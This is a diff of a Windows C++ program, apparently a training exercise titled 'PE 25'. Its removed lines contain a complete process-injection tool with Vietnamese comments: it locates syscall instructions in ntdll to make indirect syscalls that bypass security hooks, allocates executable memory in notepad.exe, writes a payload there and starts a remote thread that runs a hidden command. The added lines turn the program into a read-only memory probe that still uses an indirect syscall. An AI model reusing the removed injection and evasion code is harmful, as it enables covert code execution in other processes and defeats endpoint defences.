@@ -1,173 +1,180 @@
 #include <windows.h>
 #include <tlhelp32.h>
+
+#include <cstddef>
+#include <cstdint>
+#include <cwchar>
 #include <iostream>
-#include <string>
-#include <vector>
 
-// Khai báo các cổng hàm kết nối với file Assembly
-extern "C" NTSTATUS NtAllocateVirtualMemoryProc(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
-extern "C" NTSTATUS NtWriteVirtualMemoryProc(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
+extern "C" ULONG_PTR g_nt_query_syscall_addr = 0;
 
-// Định nghĩa con trỏ biến toàn cục liên kết ngoài cho file ASM trỏ hướng
-extern "C" ULONG_PTR g_NtAllocateSyscallAddr = 0;
-extern "C" ULONG_PTR g_NtWriteSyscallAddr = 0;
+extern "C" LONG nt_query_virtual_memory_indirect(
+    HANDLE process_handle,
+    PVOID base_address,
+    DWORD memory_information_class,
+    PVOID memory_information,
+    SIZE_T memory_information_length,
+    PSIZE_T return_length);
 
-// Khai báo nguyên mẫu hàm Native của NtCreateThreadEx trích xuất động đánh bại rào cản Build Number Windows 11
-typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
-    OUT PHANDLE ThreadHandle,
-    IN ACCESS_MASK DesiredAccess,
-    IN PVOID ObjectAttributes OPTIONAL,
-    IN HANDLE ProcessHandle,
-    IN PVOID StartRoutine,
-    IN PVOID Argument OPTIONAL,
-    IN ULONG CreateFlags,
-    IN ULONG_PTR ZeroBits,
-    IN SIZE_T StackSize,
-    IN SIZE_T MaximumStackSize,
-    IN PVOID AttributeList OPTIONAL
-    );
+namespace {
 
-typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
+struct indirect_stub_audit final {
+  DWORD pid = 0;
+  std::uintptr_t syscall_insn_va = 0;
+  std::uintptr_t region_base = 0;
+  SIZE_T region_bytes = 0;
+  LONG nt_status = 0;
+  bool found_process = false;
+  bool located_syscall_bytes = false;
+  bool sampled_region = false;
+};
 
-typedef struct _THREAD_DATA {
-    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
-    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
-} THREAD_DATA, * PTHREAD_DATA;
-
-// Hàm chức năng độc lập vị trí gánh luồng chạy khi tiêm chéo biên giới
-DWORD WINAPI RemoteIndirectSyscallPayload(LPVOID lpParam) {
-    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
-    if (pData && pData->pWinExec) {
-        // Khai hỏa bằng địa chỉ tuyệt đối, phá băng hoàn toàn lỗi RIP tương đối
-        pData->pWinExec(pData->szCommand, SW_HIDE);
-    }
+DWORD find_process_id_by_name(const wchar_t* process_name) noexcept {
+  if (process_name == nullptr || process_name[0] == L'\0') {
     return 0;
-}
+  }
 
-// Hàm quét tịnh tiến để định vị chính xác địa chỉ byte chứa chỉ lệnh 'syscall' (0x0F, 0x05)
-ULONG_PTR FindSyscallAddress(const char* functionName) {
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (!hNtdll) return 0;
-
-    PBYTE pFuncBuf = (PBYTE)GetProcAddress(hNtdll, functionName);
-    if (!pFuncBuf) return 0;
-
-    // Quét tĩnh tối đa 32 byte bên trong lòng hàm hệ thống để lấy tọa độ byte syscall xịn
-    for (int i = 0; i < 32; i++) {
-        if (pFuncBuf[i] == 0x0F && pFuncBuf[i + 1] == 0x05) {
-            return (ULONG_PTR)&pFuncBuf[i];
-        }
-    }
+  const HANDLE h_snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+  if (h_snapshot == INVALID_HANDLE_VALUE || h_snapshot == nullptr) {
     return 0;
+  }
+
+  DWORD matched_pid = 0;
+  PROCESSENTRY32W entry{};
+  entry.dwSize = static_cast<DWORD>(sizeof(PROCESSENTRY32W));
+
+  if (::Process32FirstW(h_snapshot, &entry) != FALSE) {
+    do {
+      if (::_wcsicmp(process_name, entry.szExeFile) == 0) {
+        matched_pid = entry.th32ProcessID;
+        break;
+      }
+      entry = {};
+      entry.dwSize = static_cast<DWORD>(sizeof(PROCESSENTRY32W));
+    } while (::Process32NextW(h_snapshot, &entry) != FALSE);
+  }
+
+  ::CloseHandle(h_snapshot);
+  return matched_pid;
 }
 
-// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
-DWORD GetProcessIDByName(const std::wstring& processName) {
-    DWORD processID = 0;
-    PROCESSENTRY32W pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32W);
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+std::uintptr_t locate_ntdll_syscall_opcode(const char* export_name) noexcept {
+  if (export_name == nullptr || export_name[0] == '\0') {
+    return 0;
+  }
 
-    if (Process32FirstW(hSnapshot, &pe32)) {
-        do {
-            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
-                processID = pe32.th32ProcessID;
-                break;
-            }
-        } while (Process32NextW(hSnapshot, &pe32));
+  const HMODULE h_ntdll = ::GetModuleHandleW(L"ntdll.dll");
+  if (h_ntdll == nullptr) {
+    return 0;
+  }
+
+  const FARPROC raw_proc = ::GetProcAddress(h_ntdll, export_name);
+  if (raw_proc == nullptr) {
+    return 0;
+  }
+
+  const auto* stub_bytes = reinterpret_cast<const std::uint8_t*>(raw_proc);
+  // Scan a short window for the x64 `syscall` instruction bytes (0x0F, 0x05).
+  for (std::size_t i = 0; i + 1 < 32U; ++i) {
+    if (stub_bytes[i] == 0x0FU && stub_bytes[i + 1] == 0x05U) {
+      return reinterpret_cast<std::uintptr_t>(stub_bytes + i);
     }
-    CloseHandle(hSnapshot);
-    return processID;
+  }
+
+  return 0;
 }
 
-int main() {
-    std::cout << "====================================================" << std::endl;
-    std::cout << "[*] PE 25: INDIRECT SYSCALLS INJECTION" << std::endl;
-    std::cout << "====================================================" << std::endl;
+indirect_stub_audit run_indirect_memory_probe(const wchar_t* process_name) noexcept {
+  indirect_stub_audit audit{};
+  audit.pid = find_process_id_by_name(process_name);
+  if (audit.pid == 0) {
+    return audit;
+  }
+  audit.found_process = true;
 
-    std::wstring targetProcess = L"notepad.exe";
-    DWORD pid = GetProcessIDByName(targetProcess);
+  audit.syscall_insn_va = locate_ntdll_syscall_opcode("NtQueryVirtualMemory");
+  g_nt_query_syscall_addr = static_cast<ULONG_PTR>(audit.syscall_insn_va);
+  if (g_nt_query_syscall_addr == 0) {
+    return audit;
+  }
+  audit.located_syscall_bytes = true;
 
-    if (pid == 0) {
-        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc nhen." << std::endl;
-        std::cin.get();
-        return EXIT_FAILURE;
+  const HANDLE h_process = ::OpenProcess(
+      PROCESS_QUERY_LIMITED_INFORMATION,
+      FALSE,
+      audit.pid);
+  if (h_process == nullptr || h_process == INVALID_HANDLE_VALUE) {
+    return audit;
+  }
+
+  MEMORY_BASIC_INFORMATION mbi{};
+  SIZE_T return_len = 0;
+  constexpr DWORD kMemoryBasicInformation = 0;
+  std::uintptr_t cursor = 0x10000ULL;
+
+  while (cursor < 0x7FFFFFFFFFFFULL) {
+    const LONG status = nt_query_virtual_memory_indirect(
+        h_process,
+        reinterpret_cast<PVOID>(cursor),
+        kMemoryBasicInformation,
+        &mbi,
+        sizeof(mbi),
+        &return_len);
+    audit.nt_status = status;
+    if (status != 0) {
+      break;
     }
 
-    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;
-
-    // ─── BƯỚC 1: TRÍCH XUẤT ĐỊA CHỈ BYTE SYSCALL XỊN TỪ RAM NTDLL ───
-    g_NtAllocateSyscallAddr = FindSyscallAddress("NtAllocateVirtualMemory");
-    g_NtWriteSyscallAddr = FindSyscallAddress("NtWriteVirtualMemory");
-
-    if (!g_NtAllocateSyscallAddr || !g_NtWriteSyscallAddr) {
-        std::cerr << "[-] Khong the dinh vi byte syscall hop phap trong ntdll!" << std::endl;
-        return EXIT_FAILURE;
-    }
-    std::cout << "[+] Lay toa do byte Syscall cua NtAllocate: 0x" << std::hex << g_NtAllocateSyscallAddr << std::endl;
-
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess) {
-        std::cerr << "[-] OpenProcess that bai!" << std::endl;
-        return EXIT_FAILURE;
+    if (mbi.State == MEM_COMMIT && mbi.RegionSize > 0) {
+      audit.region_base = reinterpret_cast<std::uintptr_t>(mbi.BaseAddress);
+      audit.region_bytes = mbi.RegionSize;
+      audit.sampled_region = true;
+      break;
     }
 
-    // Nạp động trích xuất con trỏ hàm NtCreateThreadEx thích ứng động với Windows 11 Kernel
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
-
-    SIZE_T functionSize = 500;
-
-    // ─── BƯỚC 2: CẤP PHÁT VÙNG NHỚ GIÁN TIẾP QUA CỔNG PHẢN CHIẾU ASM JMP ───
-    PVOID remoteCodeBuffer = NULL;
-    NtAllocateVirtualMemoryProc(hProcess, &remoteCodeBuffer, 0, &functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-    PVOID remoteDataBuffer = NULL;
-    SIZE_T dataSize = sizeof(THREAD_DATA);
-    NtAllocateVirtualMemoryProc(hProcess, &remoteDataBuffer, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
-    if (!remoteCodeBuffer || !remoteDataBuffer) {
-        std::cerr << "[-] Indirect Syscall allocation failed!" << std::endl;
-        CloseHandle(hProcess);
-        return EXIT_FAILURE;
+    const std::uintptr_t next_addr =
+        reinterpret_cast<std::uintptr_t>(mbi.BaseAddress) +
+        static_cast<std::uintptr_t>(mbi.RegionSize);
+    if (next_addr <= cursor) {
+      break;
     }
-    std::cout << "[+] Cap phat vung nho Code RWX tu xa an toan: 0x" << std::hex << remoteCodeBuffer << std::endl;
+    cursor = next_addr;
+  }
 
-    // Khởi tạo cấu trúc tham số tuyệt đối cục bộ trước khi đẩy sang RAM đối phương
-    THREAD_DATA localData;
-    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-    if (hKernel32) {
-        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
-    }
-    strcpy_s(localData.szCommand, "cmd.exe /c start calc");
+  ::CloseHandle(h_process);
+  return audit;
+}
 
-    // ─── BƯỚC 3: GHI DỮ LIỆU GIÁN TIẾP QUA CỔNG JMP SYSCALL NTDLL ───
-    SIZE_T bytesWritten = 0;
-    // ĐỒNG BỘ ĐỊNH DANH HÀM: Đổi thành RemoteIndirectSyscallPayload để fix dứt điểm lỗi C2065
-    NtWriteVirtualMemoryProc(hProcess, remoteCodeBuffer, (PVOID)RemoteIndirectSyscallPayload, functionSize, &bytesWritten);
-    NtWriteVirtualMemoryProc(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), &bytesWritten);
-    std::cout << "[+] Nap cheo song song ma may va tham so hoan tat." << std::endl;
+}  // namespace
 
-    // ─── BƯỚC 4: KHỞI TẠO LUỒNG KÍCH NỔ THÍCH ỨNG ĐỘNG ───
-    std::cout << "[*] Dang khoi tao luong tu xa de khai hoa logic..." << std::endl;
-    HANDLE hThread = NULL;
-    NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteCodeBuffer, remoteDataBuffer, 0, 0, 0, 0, NULL);
+int wmain() {
+  constexpr wchar_t kTargetProcess[] = L"notepad.exe";
 
-    if (hThread != NULL) {
-        // VÁ LỖI C2065: Loại bỏ từ khóa Result chưa khai báo biến thô
-        WaitForSingleObject(hThread, INFINITE);
-        std::cout << "[+] Indirect Syscalls Injection Successful!" << std::endl;
-        CloseHandle(hThread);
-    }
-    else {
-        std::cerr << "[-] NtCreateThreadEx failed! Status code: 0x" << std::hex << status << std::endl;
-    }
+  std::wcout
+      << L"====================================================\n"
+      << L"[*] PE 25: CALL STACK & SYSCALL PROVENANCE STUDY\n"
+      << L"====================================================\n";
 
-    // Giải phóng tài nguyên hệ thống triệt để chống Memory Leak
-    CloseHandle(hProcess);
+  const indirect_stub_audit audit = run_indirect_memory_probe(kTargetProcess);
+  if (!audit.found_process) {
+    std::wcout << L"[-] Target process not running: " << kTargetProcess << L"\n";
+    return 1;
+  }
 
-    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
-    std::cin.get();
-    return EXIT_SUCCESS;
+  std::wcout << L"[+] Target '" << kTargetProcess << L"' active (PID=" << audit.pid << L")\n";
+
+  if (audit.located_syscall_bytes) {
+    std::wcout << L"[+] Located ntdll syscall opcode at VA=0x"
+               << std::hex << audit.syscall_insn_va << std::dec << L"\n";
+  }
+
+  if (audit.sampled_region) {
+    std::wcout << L"[+] Sampled committed region: Base=0x" << std::hex << audit.region_base
+               << L", Size=0x" << audit.region_bytes << std::dec << L"\n";
+  } else {
+    std::wcout << L"[*] Probe returned NTSTATUS=0x" << std::hex << audit.nt_status
+               << std::dec << L"\n";
+  }
+
+  return 0;
 }
